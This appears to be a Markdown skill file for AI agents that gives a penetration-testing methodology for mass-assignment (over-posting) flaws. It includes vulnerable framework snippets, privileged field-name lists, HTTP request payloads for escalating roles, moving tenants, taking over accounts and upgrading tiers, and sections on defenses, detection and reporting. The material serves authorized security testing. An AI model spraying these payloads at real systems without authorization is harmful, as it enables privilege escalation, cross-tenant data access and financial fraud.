---
name: offensive-mass-assignment
description: "Mass assignment / over-posting attack methodology — spraying privileged fields (isAdmin, role, tenantId, balance) into create/update endpoints, ORM auto-binding flaws (Active Record / Eloquent / Sequelize / TypeORM / Hibernate), GraphQL mutation bulk-binding, JSON:API attribute injection, hidden field discovery via OpenAPI / DB schema / response inference, and chaining mass assignment with horizontal/vertical access bypass. Use when assessing endpoints that accept JSON / form data and persist to a database — the bug is broader than IDOR and often gives instant privilege escalation."
---

# Mass Assignment / Over-Posting

Modern frameworks "helpfully" map request payload fields directly onto database models. When the model has fields the user shouldn't control (admin flag, account balance, tenant ID), and the framework accepts whatever the request sends, the user controls them.

## Quick Workflow

1. Identify endpoints that create or update records
2. Discover the underlying model's fields (schema, OpenAPI, response inference)
3. Send each privileged field in the request payload
4. Verify which were applied
5. Chain into impact (privilege escalation, account takeover, financial)

---

## How It Happens

```ruby
# Active Record (Ruby on Rails) — pre-strong-parameters / misconfigured
def update
  @user.update_attributes(params[:user])   # binds ALL params
end
```

```javascript
// Sequelize without explicit allowlist
await User.update(req.body, { where: { id: req.params.id } });
```

```python
# Django model_form_factory or class-based view without fields whitelist
class UserUpdate(UpdateView):
    model = User
    # missing fields = [...]
```

```java
// Spring without @JsonIgnore on sensitive fields
@PostMapping("/users")
public User create(@RequestBody User user) { return userRepository.save(user); }
```

In each case, payload fields not intended for the user reach the model.

## Field Discovery

### From Responses

```http
GET /api/users/me
→ {
    "id": 42,
    "username": "jdoe",
    "email": "jdoe@x.com",
    "role": "user",            ← role exists
    "isAdmin": false,          ← isAdmin exists
    "tenant_id": 1,            ← tenant_id exists
    "credits": 50,             ← credits exists
    "createdAt": "..."
  }
```

Every field in the response is a candidate for the request.

### From OpenAPI / Swagger

```bash
curl https://api.target.com/openapi.json | jq '.components.schemas.User'
```

The schema lists all fields. Try each.

### From Schema Leak / Errors

Validation errors sometimes leak: `"Field 'admin_notes' must be a string"` → try setting `admin_notes`.

### Common Field Names to Try

```
role, roles, userRole, isAdmin, is_admin, admin, superuser,
permissions, scope, scopes, claims, groups, tier, plan,
accountType, account_type, status, active, verified, email_verified,
balance, credits, points, tokens, subscription_status,
tenantId, tenant_id, organizationId, ownerId, parent_id,
created_at, updated_at, deleted_at, version,
internal_id, external_id, ssoId, ldapDn,
mfa_enabled, mfa_secret, force_password_reset
```

## Test Methodology

```http
# Baseline: minimal valid update
PUT /api/users/me
Content-Type: application/json
Cookie: user_session

{"name": "Updated Name"}

→ 200, name changed.
```

```http
# Spray privileged fields one at a time
PUT /api/users/me
{"name": "X", "role": "admin"}
PUT /api/users/me
{"name": "X", "isAdmin": true}
PUT /api/users/me
{"name": "X", "credits": 1000000}
PUT /api/users/me
{"name": "X", "tenantId": "victim_corp"}
```

After each, verify with a fresh GET:

```http
GET /api/users/me
→ Check if the field changed.
```

## Real-World Patterns

### Account Takeover via Email Change

```http
PUT /api/users/123
{"email": "attacker@attacker.com"}
```

If the API doesn't enforce "user can only update their own user," any low-priv user changes anyone's email. Then trigger password reset → email goes to attacker.

### Tenant Move

```http
PUT /api/users/me
{"tenantId": "victim_corp"}
```

User now sees victim_corp's data via tenant-scoped queries.

### Subscription Tier Upgrade

```http
PUT /api/account
{"tier": "enterprise", "subscription_status": "active"}
```

Free users acquire enterprise features without billing.

### Hidden Field Manipulation in Multi-Step Forms

```http
POST /api/orders
{"items": [...], "total": 0, "discount": 100, "currency": "VND", "ownerId": 1}
```

`ownerId` field assigns the order to user 1, but the bill goes to user 1's payment method. Combined with currency confusion or discount manipulation, full financial impact.

## Defenses & Bypasses

### Allowlist (Strong Parameters)

```ruby
# Rails StrongParameters
params.require(:user).permit(:name, :email)   # only these are accepted
```

When done correctly, this defeats mass assignment. Bypass requires finding fields the developer added to the allowlist that shouldn't be there.

### Denylist

Typically incomplete. New fields added later forget to update the denylist. Test all candidates.

### `@JsonIgnore` / `[JsonIgnore]` (Java/.NET)

Marks fields as not deserializable. Often forgotten on internal helper fields.

### Field Renaming

Some apps map JSON keys differently than DB column names. Check OpenAPI / Swagger for `@JsonProperty` mappings.

## GraphQL Mass Assignment

```graphql
mutation {
  updateUser(input: {
    id: 1,
    name: "X",
    role: ADMIN,
    permissions: [ALL]
  }) { id role }
}
```

GraphQL accepts only declared input fields (typed). But if the schema accepts `role` for some users, all users can send it — server-side authorization on the field is required.

## Chained Impact

| Mass Assignment | Chained With | Impact |
|---|---|---|
| `role: admin` | session reuse | DA / cluster admin |
| `tenantId: victim` | data fetch | cross-tenant data |
| `isVerified: true` | identity verification | bypass KYC |
| `internalId: <victim>` | indirect lookup | account swap |
| `ownerId: <victim>` | financial endpoint | resource theft |

## Engagement Cheatsheet

```
[ ] List all create/update endpoints
[ ] For each: GET the same resource to learn field set
[ ] Check OpenAPI/Swagger for full schema
[ ] Spray privileged field names per endpoint
[ ] After each PUT/POST, GET to verify change
[ ] Document: endpoint, field that worked, impact
```

## Detection

| Signal | Defender View |
|---|---|
| Modify-then-read pattern | Audit log shows update for unusual field |
| Schema validation errors | Application log warnings about extra fields |
| Sensitive field changes | DB audit trail (if columnar audit enabled) |

If audit/log review is part of the engagement, your test pattern is visible. Coordinate with blue team if defense-in-depth review is desired.

## Reporting

- Endpoint and HTTP verb
- Field name + value that produced the change
- Confirmation request showing the persisted change
- Impact (escalation, financial, cross-tenant)
- Specific framework remediation: strong parameters, allowlist annotations, schema validation

---

## Key References

- OWASP API Security Top 10 — API6 (Mass Assignment)
- "Mass Assignment Cheat Sheet" — OWASP
- Rails Security Guide — Strong Parameters
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/mass-assignment.md
